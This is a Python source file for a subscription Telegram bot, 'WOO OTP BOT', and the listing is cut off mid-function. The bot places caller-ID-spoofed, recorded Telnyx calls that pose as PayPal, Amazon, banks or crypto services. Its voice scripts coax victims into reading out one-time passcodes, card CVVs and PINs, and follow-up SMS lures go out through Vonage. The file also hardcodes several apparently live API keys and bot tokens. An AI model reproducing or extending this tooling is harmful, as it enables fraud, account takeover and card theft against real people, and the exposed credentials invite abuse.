import numbers
import vonage
import os
from unicodedata import name
from telegram.ext import Updater
from telegram.ext import CallbackContext
from telegram.ext import CommandHandler
from telegram import Update
from telegram import ParseMode
from telegram import (ReplyKeyboardMarkup, ReplyKeyboardRemove,InlineKeyboardButton, InlineKeyboardMarkup, Update, ForceReply)
from telegram.ext import (Updater, CommandHandler, MessageHandler, Filters,
                          ConversationHandler,CallbackQueryHandler)
from keys import gen
from keys import birthdate
#import firebase_admin
import requests
#from firebase_admin import credentials
#from firebase_admin import firestore
from datetime import datetime
from datetime import timedelta
import requests
import json
import telnyx
import logging
#logging.basicConfig()
#logging.getLogger('telnyx').setLevel(logging.DEBUG)
# lets fix
# brb 10min
# omfg ?
#cred = credentials.Certificate(os.getcwd() + "\\cert.json")
#firebase_admin.initialize_app(cred)
#db = firestore.client()
#db_doc_name = "floopotp"

token = "6393928701:AAEoxCHjAH9vuex4tQjwj459e0SptAMSSR8"
telnyx.api_key = "KEY017F7B3D00BAD0692DFF6DBDF6721663_oKYubLg4Vhq4sZc92d367n"

telnyx_connection_id = "2110492288026150231"

#url = "https://f2ef-51-37-104-38.eu.ngrok.io" # REMEMBER TO CHANGE THIS ELSE IT WONT WORK
url = "https://woootp.ngrok.io" # REMEMBER TO CHANGE THIS ELSE IT WONT WORK


admins = [916829693, 916829693]

chat_ider = "5145088648"
keys = {}



if (os.path.exists("keys.json")):
    with open('keys.json', 'r') as fp:
        keys = json.load(fp)
        print('Fake key db loaded successfully')

FIRST_INP, SECOND_INP, THIRD_INP = range(3)

debug = True

#path
bulkpath = os.getcwd() + "\\bulk"

def createkey_fb(userid, key, days):
    keys[key] = {
        'adminuid': userid,
        'date-of-creation': birthdate(), 
        'date-of-expiration': "",
        'length': days,
        'useruid': "",
    }
    with open('keys.json', 'w') as fp:
        json.dump(keys, fp)
    """try:
        keys_doc = db.collection(db_doc_name).document(key)
        data = ({
            'adminuid': userid,
            'date-of-creation': birthdate(), 
            'date-of-expiration': "",
            'length': days,
            'useruid': "",
        })
        keys_doc.set(data)
    except Exception as e:
        print(e)"""

#link uid to key
def regkey(userid, key):
    try:
        """keys = db.collection(db_doc_name).document(key)
        # add 30 days to creation dat
        t = keys.get().to_dict()
        if(len(str(t['useruid']))> 5):
            return "REGISTERED"
        a = datetime.now()
        time = a + timedelta(days=int(t['length']))
        time = time.strftime('%m/%d/%Y-%H:%M:%S') # WTF IS PYTHON
        keys.update({
            db.field_path('date-of-expiration'): time,
            'useruid': userid,       
        })"""
        keyy = keys[key]
        if (len(str(keyy['useruid'])) > 5):
            return "REGISTERED"
        a = datetime.now()
        time = a + timedelta(days=int(keyy['length']))
        time = time.strftime('%m/%d/%Y-%H:%M:%S')
        keyy['date-of-expiration'] = time
        keyy['useruid'] = userid
        keys[key] = keyy
        with open('keys.json', 'w') as fp:
            json.dump(keys, fp)
        return int(keyy['length'])
    except Exception as e:
        print(e)
        return False
    # TESTING MAKE CHECK HERE
    
def lookup_key_wrap(userid):
    for key, value in keys.items():
        if value['useruid'] == userid:
            return (key, value)
    return False

#lookup uid
def check_key(userid):
        #keys = db.collection(db_doc_name)
        res = lookup_key_wrap(userid) 
        #keys.where('useruid', '==', userid).get()
        time = timedelta(0)
        if res != False:
            a = datetime.strptime(res[1]['date-of-expiration'], "%m/%d/%Y-%H:%M:%S")
            today = a - datetime.today() # INCORRECT VARIABLE NAME BUT NO BETTER CHOICE, THIS IS THE CHECK FOR EXPIRATION
            if (today.total_seconds() <= 0):
                print('key expired lol')
                keys.pop(res[0])
                with open('keys.json', 'w') as fp:
                    json.dump(keys, fp)
                #db.collection(db_doc_name).document(i.id).delete()
            else:
                time = time + today
            # if NEGATIVE DELETE KEY / ELSE ADD TO TIME          
        #CATCH NO RESPONSE
        if(res == False):
            return "INVALID"
        elif(time.total_seconds() > 0):
                # string parsing
                days = 0
                if(time.days > 0):
                    times = str(time).split(",")[1].split(" ")[1].split(":")
                    msg = msg = "You have " + str(time.days) + " Days " + times[0] + " Hours " + times[1]  + " Minutes and " +  str(round(float(times[2]))) + " Seconds left on your Subscription."
                else:
                    times = str(time).split(":")
                    if(int(times[0]) == 0):
                        msg = msg = "You have " + times[1]  + " Minutes " +  str(round(float(times[2]))) + " Seconds left on your Subscription." 
                    else:
                        msg = msg = "You have " + times[0] + " Hours  " + times[1]  + " Minutes and " +  str(round(float(times[2]))) + " Seconds left on your Subscription."

                #plop it in
                time = [msg, 1]
                return time
        else:
            return "EXPIRED"

#delete key
def deletekey_fb(key):
    try:
        #keys = db.collection(db_doc_name).document(key)
        keys.pop(key)
        with open('keys.json', 'w') as fp:
            json.dump(keys, fp)
        return True
    except: 
        return False


#cmds /start /createkey /checktime /register (KEY) /deletekey (KEY) /call

#main
def start(update: Update, context: CallbackContext):
          print(update.message.chat_id)
          update.message.reply_text(f"♛ WOO OTP BOT ♛"'\n' " Join here : @wocum to get your subscription" '\n'+'\n'  + "👤 User Commands" + '\n' + '\n'  + "🔐 》 /redeem - Redeem Key To Receive Your Subscription" + '\n' + "⏰ 》 /checktime - (Check Subscription Remaining Time)" + '\n' + '\n' + "☎️ Call Commands" + '\n'+ '\n' + "📲 》 /call - Any code Ex: Paypal, Venmo, Coinbase, Cashapp" + '\n' + "💳 》 /cvv - Capture cvv code from any credit card"+ '\n' + "💰 》 /crypto - Capture ANY OTP code with advanced crypto script."  + '\n' + "📦 》 /amazon - Get a victim to approve a amazon approval link." + '\n' + "📨 》 /email - Get victim to readout ANY OTP Code."  + '\n' + "💬 》 /remind - Sends a SMS to remind victim to pick up." + '\n' "🏦 》 /bank - Capture bank OTP code."+ '\n' + '\n' + "✨ Custom Commands" + '\n' + '\n' + "🔐 》 /createscript - Create a script with 3 parts!" + '\n' + "🔐 》 /script - Returns what the script is" + '\n' + "🔐 》 /customcall - Just like /call but with your script." + '\n' + "🔐 》 /customvoice - Set your language just like /customcall.",parse_mode=ParseMode.HTML)

def call(update: Update, context: CallbackContext):
    # get telegram username
    try:
        username = update.message.from_user.username
    except:
        username = "Unknown"
        
    print(username + " is trying to call")

    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return

    try:
        res = check_key(update.effective_user.id)
        if (int(res[1]) > 0):
            number = msg[1]
            spoof = msg[2]
            service = msg[3]
            name = msg[4]
            otpdigits = msg[5]
            tag = update.message.chat.username
            chatid = update.message.from_user['id']

            print(username + " CALLING NOW")
            telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}",from_display_name=f"{service}", record="record-from-answer", webhook_url=f"{url}/voice/{number}/{spoof}/{service}/{name}/{otpdigits}/{chatid}/{tag}")
            update.message.reply_text(f"🟩 Calling {number} from {spoof}")
        else:
            update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)     
    except Exception as err:
            update.message.reply_text("▪ Error Has Occured!" + '\n' + '\n' + "🡢 Your command is incorrect / Bot Is Down" + '\n' + "🡢 /call number spoofnumber service name otpdigits")
def crypto(update: Update, context: CallbackContext):
    #print(update.message['text'])
    msg = str(update.message['text']).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return
    res = check_key(update.effective_user.id)
    try:
        if (int(res[1]) > 0):
            try:
                tguser = update.message.chat.username
                number = msg[1]
                spoof = msg[2]
                service = msg[3]
                name = msg[4]
                otpdigits = msg[6]
                last4digits = msg[5]
                tag = update.message.chat.username
                chatid = update.message.from_user['id']
                telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", record="record-from-answer", webhook_url=f"{url}/crypto/{number}/{spoof}/{service}/{name}/{last4digits}/{otpdigits}/{chatid}/{tag}")
                update.message.reply_text(f"🟩 Calling {number} from {spoof}")
            except Exception as err:
                print(err)
                update.message.reply_text("▪ Error Has Occured!" + '\n' + '\n' + "🡢 Your command is incorrect / Bot Is Down" + '\n' + "🡢 /crypto number spoofnumber service name last4digits otpdigits") 
    except:
        res = check_key(update.effective_user.id)
        if(res == "EXPIRED"): 
            update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)     
        else:
            update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)  

def help(update: Update, context: CallbackContext):
          update.message.reply_text(f"♛ WOO OTP BOT ♛"'\n' " Join here : @wocum to get your subscription" '\n'+'\n'  + "👤 User Commands" + '\n' + '\n'  + "🔐 》 /redeem - Redeem Key To Receive Your Subscription" + '\n' + "⏰ 》 /checktime - (Check Subscription Remaining Time)" + '\n' + '\n' + "☎️ Call Commands" + '\n'+ '\n' + "📲 》 /call - Any code Ex: Paypal, Venmo, Coinbase, Cashapp" + '\n' + "💳 》 /cvv - Capture cvv code from any credit card"+ '\n' + "💰 》 /crypto - Capture ANY OTP code with advanced crypto script."  + '\n' + "📦 》 /amazon - Get a victim to approve a amazon approval link." + '\n' + "📨 》 /email - Get victim to readout ANY OTP Code."  + '\n' + "💬 》 /remind - Sends a SMS to remind victim to pick up." + '\n' "🏦 》 /bank - Capture bank OTP code."+ '\n' + '\n' + "✨ Custom Commands" + '\n' + '\n' + "🔐 》 /createscript - Create a script with 3 parts!" + '\n' + "🔐 》 /script - Returns what the script is" + '\n' + "🔐 》 /customcall - Just like /call but with your script." + '\n' + "🔐 》 /customvoice - Set your language just like /customcall.",parse_mode=ParseMode.HTML)
def pin(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return

    res = check_key(update.effective_user.id)
    try:
        if (int(res[1]) > 0):
            try:
                tguser = update.message.chat.username
                number = msg[1]
                spoof = msg[2]
                service = msg[3]
                name = msg[4]
                otpdigits = msg[5]
                tag = update.message.chat.username
                chatid = update.message.from_user['id']
                telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{service}", record="record-from-answer", webhook_url=f"{url}/pin/{number}/{spoof}/{service}/{name}/{otpdigits}/{chatid}/{tag}")
                update.message.reply_text(f"🟩 Calling {number} from {spoof}")
            except:
            
                update.message.reply_text("▪ Error Has Occured!" + '\n' + '\n' + "🡢 Your command is incorrect / Bot Is Down" + '\n' + "🡢 /pin number spoofnumber service name otpdigits")
    except:
        res = check_key(update.effective_user.id)
        if(res == "EXPIRED"): 
            update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)     
        else:
            update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)

def email(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return
    res = check_key(update.effective_user.id)
    try:
        if (int(res[1]) > 0):
            try:
                tguser = update.message.chat.username
                number = msg[1]
                spoof = msg[2]
                service = msg[3]
                name = msg[4]
                tag = update.message.chat.username
                chatid = update.message.from_user['id']
                telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{service}", webhook_url=f"{url}/email/{number}/{spoof}/{service}/{name}/3/{chatid}/{tag}")
                update.message.reply_text(f"🟩 Calling {number} from {spoof}")
            except:
            
                update.message.reply_text("▪ Error Has Occured!" + '\n' + '\n' + "🡢 Your command is incorrect / Bot Is Down" + '\n' + "🡢 /email number spoofnumber service name")
    except:
        res = check_key(update.effective_user.id)
        if(res == "EXPIRED"): 
            update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)     
        else:
            update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)

def amazon(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return
    res = check_key(update.effective_user.id)
    try:
        if (int(res[1]) > 0):
            try:
                tguser = update.message.chat.username
                number = msg[1]
                spoof = msg[2]
                service = "Amazon"
                name = msg[3]
                tag = update.message.chat.username
                chatid = update.message.from_user['id']
                telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{service}", webhook_url=f"{url}/amazon/{number}/{spoof}/{service}/{name}/3/{chatid}/{tag}")
                update.message.reply_text(f"🟩 Calling {number} from {spoof}")
            except:
            
                update.message.reply_text("▪ Error Has Occured!" + '\n' + '\n' + "🡢 Your command is incorrect / Bot Is Down" + '\n' + "🡢 /amazon number spoofnumber name")
    except:
        res = check_key(update.effective_user.id)
        if(res == "EXPIRED"): 
            update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)     
        else:
            update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)
def etoro(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    res = check_key(update.effective_user.id)
    try:
        if (int(res[1]) > 0):
            try:
                tguser = update.message.chat.username
                number = msg[1]
                spoof = msg[2]
                tag = update.message.chat.username
                chatid = update.message.from_user['id']
                telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"etoro", record="record-from-answer", webhook_url=f"{url}/etoro/{number}/{spoof}/etoro/joe/1/{chatid}/{tag}")
                update.message.reply_text(f"🟩 Calling {number} from {spoof}")
            except:
                update.message.reply_text("❌ Oops... Something went wrong." + '\n' + '\n' + "☎️ /call 15087144578 18888888888 Paypal John 6" + '\n' + "📲 /call number spoofnumber")
    except:
        res = check_key(update.effective_user.id)
        if(res == "EXPIRED"): 
            update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)     
        else:
            update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)  

def bank(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return
    res = check_key(update.effective_user.id)
    try:
        if (int(res[1]) > 0):
            try:
                tguser = update.message.chat.username
                number = msg[1]
                spoof = msg[2]
                bank = msg[3]
                name = msg[4]
                otpdigits = msg[5]
                tag = update.message.chat.username
                chatid = update.message.from_user['id']
                telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{bank}", record="record-from-answer", webhook_url=f"{url}/bank/{number}/{spoof}/{bank}/{name}/{otpdigits}/{chatid}/{tag}")
                update.message.reply_text(f"🟩 Calling {number} from {spoof}")
            except:
                update.message.reply_text("▪ Error Has Occured!" + '\n' + '\n' + "🡢 Your command is incorrect / Bot Is Down" + '\n' + "🡢 /bank number spoofnumber bank name otpdigits") 
    except:
        res = check_key(update.effective_user.id)
        if(res == "EXPIRED"): 
            update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)     
        else:
            update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)

def cvv(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return
    res = check_key(update.effective_user.id)
    try:
        if (int(res[1]) > 0):
            try:
                tguser = update.message.chat.username
                number = msg[1]
                spoof = msg[2]
                bank = msg[3]
                name = msg[4]
                cvvdigits = msg[5]
                last4digits = msg[6]
                tag = update.message.chat.username
                chatid = update.message.from_user['id']
                telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{bank}", record="record-from-answer", webhook_url=f"{url}/cvv/{number}/{spoof}/{bank}/{name}/{cvvdigits}/{last4digits}/{chatid}/{tag}")
                update.message.reply_text(f"🟩 Calling {number} from {spoof}")
            except:
                update.message.reply_text("▪ Error Has Occured!" + '\n' + '\n' + "🡢 Your command is incorrect / Bot Is Down" + '\n' + "🡢 /cvv number spoofnumber bank name cvvdigits last4digits") 
    except:
        res = check_key(update.effective_user.id)
        if(res == "EXPIRED"): 
            update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)     
        else:
            update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)  



def createkey(update: Update, context: CallbackContext):
    # get message 
    if(update.effective_user.id in admins):
        if (any([char.isdigit() for char in update.message.text])):
            # split days
            days = update.message.text.split(" ")
            #create key
            msg = gen((days[1]))
            #add key to firebase + userid who made key + time
            createkey_fb(update.effective_user.id, msg, days[1])  
            #send key
            context.bot.send_message(chat_id=update.effective_chat.id, text=msg)
        else:
            context.bot.send_message(chat_id=update.effective_chat.id, text="Please include the number of days, /createkey 30")
    else:
        context.bot.send_message(chat_id=update.effective_chat.id, text="❌ You do not have permissions to create keys")
# make a command to create a custom script, using a conservation with 4 questions/answers
def createcustom(update: Update, context: CallbackContext):
    # prompt user for 4 questions
    context.bot.send_message(chat_id=update.effective_chat.id, text="test")
    # parse the first question
    first = update.message.text
    print(first)
def generate(update: Update, context: CallbackContext):
    # get message 
    if(update.effective_user.id in admins2):
        if (any([char.isdigit() for char in update.message.text])):
            # split days
            days = update.message.text.split(" ")
            #create key
            msg = gen((days[1]))
            #add key to firebase + userid who made key + time
            createkey_fb(update.effective_user.id, msg, days[1])  
            #send key
            context.bot.send_message(chat_id=update.effective_chat.id, text=msg)
        else:
            context.bot.send_message(chat_id=update.effective_chat.id, text="Please include the number of days, /createkey 30")
    else:
        context.bot.send_message(chat_id=update.effective_chat.id, text="❌ You do not have permissions to create keys")

def createbulk(update: Update, context: CallbackContext):
    if(update.effective_user.id in admins):  
        if (any([char.isdigit() for char in update.message.text])):
            days = update.message.text.split(" ")
            if(len(days) == 3):
                msg = days[1] + " keys with a length of " + days[2] + " days have been added to keys.txt and firebase"
                try:
                    f = open(bulkpath + '\\' + "bulk.txt", "w")
                    l = int(days[1])
                    for x in range(l):
                        k = gen(days[2])
                        createkey_fb(update.effective_user.id, k, days[2])
                        f.write(k + "\n")
                        context.bot.send_message(chat_id=update.effective_chat.id, text=k)
                    f.close()
                    # success
                    context.bot.send_message(chat_id=update.effective_chat.id, text=msg)             
                except:
                    context.bot.send_message(chat_id=update.effective_chat.id, text="An error occured on key creation, please try again")   
            else: 
                context.bot.send_message(chat_id=update.effective_chat.id, text="Please use the correct format, /createbulk 30 10")
        else:
            context.bot.send_message(chat_id=update.effective_chat.id, text="Please use the correct format, /createbulk 30 10")
def bulkdank(update: Update, context: CallbackContext):
    if(update.effective_user.id in admins):  
        if (any([char.isdigit() for char in update.message.text])):
            days = update.message.text.split(" ")
            if(len(days) == 3):
                msg = days[1] + " keys with a length of " + days[2] + " days have been added to keys.txt and firebase"
                try:
                    f = open(bulkpath + '\\' + "bulk.txt", "w")
                    l = int(days[1])
                    for x in range(l):
                        k = gen(days[2])
                        createkey_fb(update.effective_user.id, k, days[2])
                        f.write(k + "\n")
                        context.bot.send_message(chat_id=chat_ider, text=k)
                    f.close()
                    # success
                    context.bot.send_message(chat_id=update.effective_chat.id, text=msg)             
                except:
                    context.bot.send_message(chat_id=update.effective_chat.id, text="An error occured on key creation, please try again")   
            else: 
                context.bot.send_message(chat_id=update.effective_chat.id, text="Please use the correct format, /createbulk 30 10")
        else:
            context.bot.send_message(chat_id=update.effective_chat.id, text="Please use the correct format, /createbulk 30 10")

def deletekey(update: Update, context: CallbackContext):
    # get message 
    if(update.effective_user.id in admins):
        if (any([char.isdigit() for char in update.message.text])):
            # split days
            key = update.message.text.split(" ")
            #delete key from firebase
            if(deletekey_fb(key[1])):
                msg = "Key: " + str(key[1]) + " has been deleted"
                context.bot.send_message(chat_id=update.effective_chat.id, text=msg)
            else:
                context.bot.send_message(chat_id=update.effective_chat.id, text="Key was not found")

        else:
            context.bot.send_message(chat_id=update.effective_chat.id, text="Please include the key, /deletekey WOOOTP-XXXX-XXXXX-X")
    else:
        context.bot.send_message(chat_id=update.effective_chat.id, text="You do not have permissions to delete keys")
        
# Redeem command
def register(update: Update, context: CallbackContext):
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
    if (any([char.isdigit() for char in update.message.text])):
        # split 
        key = update.message.text.split(" ")[1]
        #check key
        r = regkey(update.effective_user.id, key)
        if(isinstance(r, int)):
            if(r > 0):
                user = update.message.from_user
                context.bot.send_message(chat_id=update.effective_chat.id, text="Have to be inside @Wocum for calls to work | Your key has been activated for " + str(r) + " day(s)")
                context.bot.send_message(chat_id=chat_ider, text="Key redeemed by "+str(user)+" | Days: "+str(r)+ "days(s)")
                #requests.post(f"https://discord.com/api/v8/channels/987411730973995009/messages", data={'content' : f"Key redeemed by {user}"}, headers={'authorization': "Bot OTc3MjU3MTI4ODY5ODg4MDYx.GwyRqq.6nQfUXGS8dAt56y-uRVdwLYT57TXUvht9XZDwE"})    
                tag = update.message.chat.username
        elif(r=="EXPIRED"):
            context.bot.send_message(chat_id=update.effective_chat.id, text="Your key is Invalid.")
        elif(r=="REGISTERED"):
            context.bot.send_message(chat_id=update.effective_chat.id, text="Your key is Already Used.")        
        else:
            context.bot.send_message(chat_id=update.effective_chat.id, text="Your Key is Invalid.")
    else:
        context.bot.send_message(chat_id=update.effective_chat.id, text="Please include the key, /redeem sus-XXXX-XXXXX-X")


def sendall(update: Update, context: CallbackContext):
    if(update.effective_user.id == chat_ider): 
        first = update.message.text
        context.user_data['first'] = first
        new_string = first.replace('/sendall', '')  
        with open("users.txt") as file:
            while (line := file.readline().rstrip()):
                try:
                    chatid = context.bot.send_message(chat_id=line, text=new_string)

                    print(f"Sent Message To ID: {line}")
                except Exception as e:
                    print(e)
        
        return
    else:
        context.bot.send_message(chat_id=update.effective_chat.id, text="🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML) 

def testsendall(update: Update, context: CallbackContext):
    first = update.message.text
    context.user_data['first'] = first
    new_string = first.replace('/testsendall', '')
    context.bot.send_message(chat_id=update.effective_chat.id, text=new_string)


def balance(update: Update, context: CallbackContext):

    tbalance = telnyx.Balance.retrieve()    
    context.bot.send_message(chat_id=update.effective_chat.id, text=f"🔒 Balance: {tbalance}", parse_mode=ParseMode.HTML)



def checktime(update: Update, context: CallbackContext):
    #digits
    res = check_key(update.effective_user.id)
    try:
        if(int(res[1]) > 0):
            msg = str(res[0])
            context.bot.send_message(chat_id=update.effective_chat.id, text=msg) 
    except:
        if(res == "EXPIRED"):
            context.bot.send_message(chat_id=update.effective_chat.id, text="🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML) 
        else:
            context.bot.send_message(chat_id=update.effective_chat.id, text="🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)

def remind(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return
    res = check_key(update.effective_user.id)
    try:
        if (int(res[1]) > 0):
            try:
                tguser = update.message.chat.username
                number = msg[1]
                service = msg[2]
                name = msg[3]
                tag = update.message.chat.username
                your_telnyx_number = "+19808888120"
                update.message.reply_text(f"🟩 Reminder sent to {number} from {service} \n\n {service}: Hello {name}, We have tried reaching out to you. We will call you back as soon as possible. We appreciate your patience as we continue to solve this issue.")
                reminder = f"{service}: Hello {name}, We have tried reaching out to you. We will call you back as soon as possible. We appreciate your patience as we continue to solve this issue."
                client = vonage.Client(key="6781dcc9", secret="969zhY1SgrOOpi0h")
                responseData = client.sms.send_message(
                {
                    "from": your_telnyx_number,
                    "to": number,
                    "text": reminder
                }
                            )
            except Exception as ex:
                print(ex)
                update.message.reply_text("▪ Error Has Occured!" + '\n' + '\n' + "🡢 Your command is incorrect / Bot Is Down" + '\n' + "🡢 /remind number service name")
    except:
        res = check_key(update.effective_user.id)
        if(res == "EXPIRED"): 
            update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)     
        else:
            update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)


def set_input_handler(update: Update, context: CallbackContext):
    context.bot.send_message(chat_id=update.effective_chat.id,
                                 text="Please enter the first part of the script \nVARIABLES: {name} {module} {otpdigits}", parse_mode=ParseMode.HTML)
    return FIRST_INP

def first_input_by_user(update: Update, context: CallbackContext):
    first = update.message.text
    context.user_data['first'] = first
    context.bot.send_message(chat_id=update.effective_chat.id,
                                 text='Please enter the second part of the script \nVARIABLES: {name} {module} {otpdigits}', parse_mode=ParseMode.HTML)
    return SECOND_INP

def second_input_by_user(update: Update, context: CallbackContext):
    second = update.message.text
    context.user_data['second'] = second
    context.bot.send_message(chat_id=update.effective_chat.id,
                                 text='Please enter the third part of the script \nVARIABLES: {name} {module} {otpdigits}',parse_mode=ParseMode.HTML)
    return THIRD_INP

def third_input_by_user(update: Update, context: CallbackContext):
    ''' The user's reply to the name prompt comes here  '''
    third = update.message.text

    context.user_data['third'] = third
    part1 = context.user_data['first']
    part2 = context.user_data['second']
    part3 = context.user_data['third']
    res = check_key(update.effective_user.id)
    if(res == "EXPIRED" or res == "INVALID"): 
        update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)
        return
            

        
        
    try:
        url = "https://api.jsonbin.io/v3/b"
        headers = {
              'Content-Type': 'application/json',
              'X-Master-Key': '$2b$10$IzWyjTwO3jhxBxSuZjFK6.lhY5t6pP5cDp7PNdx3Lytle9uxs5xa.'
        }
        data = {"part1": part1, "part2": part2, "part3": part3}
        req = requests.post(url, json=data, headers=headers)
        respp = json.loads(str(req.text))
        update.message.reply_text("🔒 Custom Script ID: "+respp["metadata"]["id"],parse_mode=ParseMode.HTML)

        return ConversationHandler.END
    except:
        res = check_key(update.effective_user.id)



def hangup(update: Update, context: CallbackContext):
    update.message.reply_text(
        'Call hanged Up')
    return call.hangup


def cancel(update: Update, context: CallbackContext):
    update.message.reply_text(
        'Custom cancelled by user. Send /custom to start again')
    return ConversationHandler.END

def script(update: Update, context: CallbackContext):
    
    msg = str(update.message.text).split()
    res = check_key(update.effective_user.id)
    try:
        if (int(res[1]) > 0):
            try:
                sid = msg[1]
                url = f"https://api.jsonbin.io/v3/b/{sid}/latest"
                headers = {
                      'X-Master-Key': '$2b$10$IzWyjTwO3jhxBxSuZjFK6.lhY5t6pP5cDp7PNdx3Lytle9uxs5xa.'
                }
                req = requests.get(url, json=None, headers=headers)
                partsj = json.loads(str(req.text))
                part1 = partsj["record"]["part1"]
                part2 = partsj["record"]["part2"]
                part3 = partsj["record"]["part3"]
                update.message.reply_text(f"Part 1️⃣: {part1}\n\nPart 2️⃣: {part2}\n\nPart 3️⃣: {part3}")

            except Exception as ex:

                update.message.reply_text("▪ Error Has Occured!" + '\n' + '\n' + "🡢 Your command is incorrect / Bot Is Down" + '\n' + "🡢 /script scriptid")
    except:
        res = check_key(update.effective_user.id)
        if(res == "EXPIRED"): 
            update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)     
        else:
            update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)    
def customcall(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return

    res = check_key(update.effective_user.id)
    try:
        if (int(res[1]) > 0):
            try:
                tguser = update.message.chat.username
                number = msg[1]
                spoof = msg[2]
                service = msg[3]
                name = msg[4]
                otpdigits = msg[5]
                sid = msg[6]
                tag = update.message.chat.username
                chatid = update.message.from_user['id']
                telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{service}", record="record-from-answer", webhook_url=f"{url}/custom/{number}/{spoof}/{service}/{name}/{otpdigits}/{sid}/{chatid}/{tag}")
                update.message.reply_text(f"🟩 Calling {number} from {spoof}")
            except:
            
                update.message.reply_text("▪ Error Has Occured!" + '\n' + '\n' + "🡢 Your command is incorrect / Bot Is Down" + '\n' + "🡢 /call number spoofnumber service name otpdigits scriptid")
    except:
        res = check_key(update.effective_user.id)
        if(res == "EXPIRED"): 
            update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)     
        else:
            update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)
def customvoice(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return
    options = ["arb","cmn-CN","cy-GB","da-DK","de-DE","en-AU","en-GB","en-GB-WLS","en-IN","en-US","es-ES","es-MX","es-US","fr-CA","fr-FR","hi-IN","is-IS","it-IT","ja-JP","ko-KR","nb-NO","nl-NL","pl-PL","pt-BR","pt-PT","ro-RO","ru-RU","sv-SE","tr-TR"]
    res = check_key(update.effective_user.id)
    try:
        if (int(res[1]) > 0):
            try:
                tguser = update.message.chat.username
                number = msg[1]
                spoof = msg[2]
                service = msg[3]
                name = msg[4]
                otpdigits = msg[5]
                sid = msg[6]
                lang = msg[7]
                tag = update.message.chat.username
                chatid = update.message.from_user['id']
                if not lang in options:
